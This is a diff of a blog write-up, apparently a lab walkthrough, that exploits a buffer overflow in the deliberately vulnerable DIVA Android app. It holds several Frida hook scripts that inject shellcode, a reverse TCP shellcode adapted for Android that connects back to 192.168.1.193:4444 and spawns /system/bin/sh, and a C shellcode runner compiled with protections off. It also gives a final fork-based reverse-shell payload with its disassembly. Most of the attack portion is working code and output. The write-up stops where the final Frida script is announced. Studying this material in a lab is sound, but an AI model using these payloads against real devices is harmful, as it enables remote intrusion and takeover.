+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>After various test we understood. Objdump dump in linux format, we need to use some other android tool.
+<br>Fortunately in android toolchain there is a proper version of objdump.
+<br>Dump shellcode again, adjust exploit and test it again.
+<br>Ok this is first problem, the second is that if we overwrite binary, when It needs to call libc functions, it doesnt find plt table.
+<br>Third problem is that the shellcode is full of nullbytes.
+<br>**Now let’s solve memory area problem**
+<br>As we already told, when function GetStringUTFChars ret, it frees malloc and this cause Jump to bad (corrupted) address, plus the GetStringUTFChars functions are called multilple times, not only for take my input, and everytime it is called, new malloc with shellcode is created.
+<br>To solve this problem we changed the logic of program, and create malloc at the beginnig of hook.
+<br>![14-75](https://teckk2.github.io/assets/images/DIVA/14-75.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var shell = [];
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var sh = Memory.alloc(128);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 128, 'rwx');
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 128}));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;});
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Let’s try now simple reverse TCP shellcode (no libc, nullfree)
+<br>We abandoned old one and try to play this new one that it is a classic linux x68 shellcode: [http://shell-storm.org/shellcode/files/shellcode-833.php](http://shell-storm.org/shellcode/files/shellcode-833.php)
+<br>![14-76](https://teckk2.github.io/assets/images/DIVA/14-76.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>*/                                                                                                                                                                           <br>                                                                                                                                            
+<br>#include <stdio.h>
+<br>#include <string.h>
+<br>
+<br>unsigned char code[] = \
+<br>
+<br>"\x68"
+<br>"\x7f\x01\x01\x01"  // <- IP Number "127.1.1.1"
+<br>"\x5e\x66\x68"
+<br>"\xd9\x03"          // <- Port Number "55555"
+<br>"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
+<br>"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
+<br>"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
+<br>"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
+<br>"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
+<br>"\xeb\xce";
+<br>
+<br>main ()
+<br>{
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// When the IP contains null-bytes, printf will show a wrong shellcode length.
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;printf("Shellcode Length:  %d\n", strlen(code));
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;// Pollutes all registers ensuring that the shellcode runs in any circumstance.
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;__asm__ ("movl $0xffffffff, %eax\n\t"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %ebx\n\t"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %ecx\n\t"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %edx\n\t"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %esi\n\t"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %edi\n\t"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %ebp");
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;int (*ret)() = (int(*)())code;
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;ret();
+<br>
+<br>}
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Let’s edit the new shellcode
+<br>We have to do the following things:
+<br>&nbsp;&nbsp;•	Change IP Address
+<br>&nbsp;&nbsp;•	Change Port
+<br>&nbsp;&nbsp;•	Change /bin/sh with /system/bin/sh
+<br>The first 2 steps are easy, but last is not simple as replace string.
+<br>The string is pushed in little endian, and every 4 bytes it pushed to stack, and we have to manually add push instruction.
+<br>Finally done.
+<br>Working shellcode (tested with the following testing shellcode script)
+<br>![14-77](https://teckk2.github.io/assets/images/DIVA/14-77.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>#include<stdio.h>                                                                                                                                                             <br>#include<string.h>
+<br>
+<br>unsigned char code[] = \
+<br>"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
+<br>"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
+<br>"\xc0\xa8\x01\xc1"  // <--- ip address
+<br>"\x66\x68"
+<br>"\x11\x5c"          // <--- tcp port
+<br>"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
+<br>"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x74\x65\x6d\x2f\x68\x2f\x73\x79\x73\x89\xe3\xcd\x80";
+<br>
+<br>main()
+<br>{
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;printf("Shellcode Length:  %d\n", strlen(code));
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;int (*ret)() = (int(*)())code;
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;ret();
+<br>
+<br>}
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Compiled with:
+<p class="message">
+  android-ndk-r12b/x86/bin/i686-linux-android-gcc shellcode.c -o shellcode -fno-stack-protector -z execstack -m32 –pie
+</p>
+<br>Pushed to android, ran it and reverse shell popped up :)
+<br>Finally it works, what the ride to hell…
+<br>The shellcode, tested on shellcode tester cross-compiled worked fine, yeah!!
+<br>![14-78](https://teckk2.github.io/assets/images/DIVA/14-78.png)
+<br>But unfortunately the reverse shell dies after few moment of connecting
+<br>But…
+<br>We copied the last edited shellcode to memory, call it and all worked fine....or not?
+<br>The reverse shell arrived but the process died immediately, killing also reverse shell.
+<br>![14-79](https://teckk2.github.io/assets/images/DIVA/14-79.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0x6a, 0x66, 0x58, 0x99, 0x52, 0x42, 0x52, 0x89, 0xd3, 0x42, 0x52, 0x89, 0xe1, 0xcd, 0x80, 0x93, 0x89, 0xd1, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0xb0, 0x66, 0x87, 0xda, 0x68, 0xc0, 0xa8, 0x01, 0xc1, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x53, 0x43, 0x89, 0xe1, 0x6a, 0x10, 0x51, 0x52, 0x89, 0xe1, 0xcd,>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var sh = Memory.alloc(128);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 128, 'rwx');
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 128}));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;});
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>![14-80](https://teckk2.github.io/assets/images/DIVA/14-80.png)
+<br>![14-81](https://teckk2.github.io/assets/images/DIVA/14-81.png)
+<br>As you can see in the screenshot the shell dies immediately
+<p class="message">
+<br>gef➤  si
+<br>Warning:
+<br>Cannot insert breakpoint 1.
+<br>Cannot access memory at address 0xcde90ad0
+<br>
+<br>Command aborted.
+</p>
+<br>From execve man:
+<p class="message">
+  execve() executes the program referred to by pathname. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.
+</p>
+<br>Maybe is it the issue?
+<br>Let’s preserve memory area
+<br>Just I done in chapter, instead using malloc memory I overwritten a small section of binary.
+<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[*] Java.vm.env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0x6a, 0x66, 0x58, 0x99, 0x52, 0x42, 0x52, 0x89, 0xd3, 0x42, 0x52, 0x89, 0xe1, 0xcd, 0x80, 0x93, 0x89, 0xd1, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0xb0, 0x66, 0x87, 0xda, 0x68, 0xc0, 0xa8, 0x01, 0xc1, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x53, 0x43, 0x89, 0xe1, 0x6a, 0x10, 0x51, 0x52, 0x89, 0xe1, 0xcd];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;//var sh = Memory.alloc(128);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var sh = Process.getModuleByName('base.odex').base.add(0x50);  // <----- HERE
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 128, 'rwx');
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 128}));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;});
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Unfortunately it has not solved the problem.
+<br>Let’s try forking the process
+<br>we edited our shellcode again, to add forking process and now the shellcode is spawned without killing Diva process nor itself.
+<br>Haha it worked finally
+<p class="message">
+  \x29\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x02\xeb\x05\x29\xc0\x40\xcd\x80\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68\xc0\xa8\x01\xc1\x66\x68\x11\x5c\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x74\x65\x6d\x2f\x68\x2f\x73\x79\x73\x89\xe3\xcd\x80
+</p>
+<br>In assembly it is:
+<p class="message">
+<br># ndisasm -b32 final_shellcode
+<br>/* main: if (fork()) goto exit; else goto execve; */
+<br>00000000  29C0              sub eax,eax
+<br>00000002  B002              mov al,0x2
+<br>00000004  CD80              int 0x80                /* Fork syscall #2 */
+<br>00000006  85C0              test eax,eax
+<br>00000008  7502              jnz 0xc
+<br>0000000A  EB05              jmp short 0x11
+<br>
+<br>/* exit: exit(x); */
+<br>0000000C  29C0              sub eax,eax 
+<br>0000000E  40                inc eax
+<br>0000000F  CD80              int 0x80                /* Exit syscall #1 */
+<br>
+<br>/* start: execve() */
+<br>00000011  6A66              push byte +0x66
+<br>00000013  58                pop eax
+<br>00000014  99                cdq
+<br>00000015  52                push edx
+<br>00000016  42                inc edx
+<br>00000017  52                push edx
+<br>00000018  89D3              mov ebx,edx
+<br>0000001A  42                inc edx
+<br>0000001B  52                push edx
+<br>0000001C  89E1              mov ecx,esp
+<br>0000001E  CD80              int 0x80                /* socketcall syscall #102 */
+<br>00000020  93                xchg eax,ebx
+<br>00000021  89D1              mov ecx,edx
+<br>00000023  B03F              mov al,0x3f
+<br>00000025  CD80              int 0x80                /* dup2 syscall #63 */
+<br>00000027  49                dec ecx
+<br>00000028  79F9              jns 0x23
+<br>0000002A  B066              mov al,0x66
+<br>0000002C  87DA              xchg ebx,edx
+<br>0000002E  68C0A801C1        push dword 0xc101a8c0
+<br>00000033  6668115C          push word 0x5c11
+<br>00000037  6653              push bx
+<br>00000039  43                inc ebx
+<br>0000003A  89E1              mov ecx,esp
+<br>0000003C  6A10              push byte +0x10
+<br>0000003E  51                push ecx
+<br>0000003F  52                push edx
+<br>00000040  89E1              mov ecx,esp
+<br>00000042  CD80              int 0x80                /* socketcall syscall #102 */
+<br>00000044  6A0B              push byte +0xb
+<br>00000046  58                pop eax
+<br>00000047  99                cdq
+<br>00000048  89D1              mov ecx,edx
+<br>0000004A  52                push edx
+<br>0000004B  682F2F7368        push dword 0x68732f2f
+<br>00000050  682F62696E        push dword 0x6e69622f
+<br>00000055  6874656D2F        push dword 0x2f6d6574
+<br>0000005A  682F737973        push dword 0x7379732f
+<br>0000005F  89E3              mov ebx,esp
+<br>00000061  CD80              int 0x80                /* execve syscall #11 */
+<br>00000063  0A                db 0x0a
+</p>
+<br>And the final Frida exploit script is
 <br>
 <br>
 <br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
+
+
 
 <p class="message">
   ~ tavşanı sever
